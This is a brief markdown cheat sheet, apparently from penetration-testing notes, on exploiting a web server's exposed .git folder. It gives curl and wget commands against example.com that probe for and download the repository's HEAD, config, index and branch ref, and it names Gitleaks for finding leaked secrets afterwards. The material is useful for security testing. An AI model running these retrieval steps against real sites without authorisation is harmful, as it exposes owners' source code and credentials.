<h1 align="center">.git Folder</h1>

<br>


### Check for Accessibility

```bash
curl -I https://example.com/.git/HEAD
```

<br>

### Download Core Files

```bash
wget https://example.com/.git/config              # Contains remote URLs, user info
wget https://example.com/.git/index               # The staging area for the next commit
wget https://example.com/.git/refs/heads/master   # The commit hash of the main branch
```


<br>


### Post-Exploitation Analysis

There are automated tools that can be used to seach for sensitive data.
- **Gitleaks**: Gitleaks is an open-source SAST tool designed to scan the entire Git history to detect leaked secrets like API keys, passwords, and tokens.
